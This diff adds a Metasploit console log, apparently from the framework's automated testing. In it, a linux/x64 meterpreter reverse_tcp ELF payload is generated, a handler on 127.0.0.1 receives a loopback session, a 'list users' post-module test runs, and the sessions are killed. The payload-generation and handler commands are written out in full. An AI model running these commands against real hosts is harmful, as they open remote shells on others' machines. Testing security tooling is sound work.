@@ -1,0 +1,26 @@
+use linux/x64/meterpreter/reverse_tcp
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20240229-2918-7c7qtttxt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> generate -o /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20240229-2918-omap2c -f elf AutoVerifySessionTimeout=30 lport=6010 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/linuxx64meterpreterreverse_tcp_debug_log20240229-2918-ix4rzxtxt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+SessionTlvLogging => file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20240229-2918-7c7qtttxt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> [*] Writing 250 bytes to /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20240229-2918-omap2c...
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> to_handler AutoVerifySessionTimeout=30 lport=6010 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/linuxx64meterpreterreverse_tcp_debug_log20240229-2918-ix4rzxtxt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+[*] Payload Handler Started as Job 9
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6010 
+[*] Sending stage (3045380 bytes) to 127.0.0.1
+[*] Meterpreter session 10 opened (127.0.0.1:6010 -> 127.0.0.1:42434) at 2024-02-29 09:42:37 +0000
+use test/unix
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> run session=10 AddEntropy=true Verbose=true
+[*] Running against session 10
+[*] Session type is meterpreter and platform is linux
+[+] should list users
+[*] Testing complete in 0.0 seconds
+[*] Passed: 1; Failed: 0; Skipped: 0
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 10 closed.
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> 
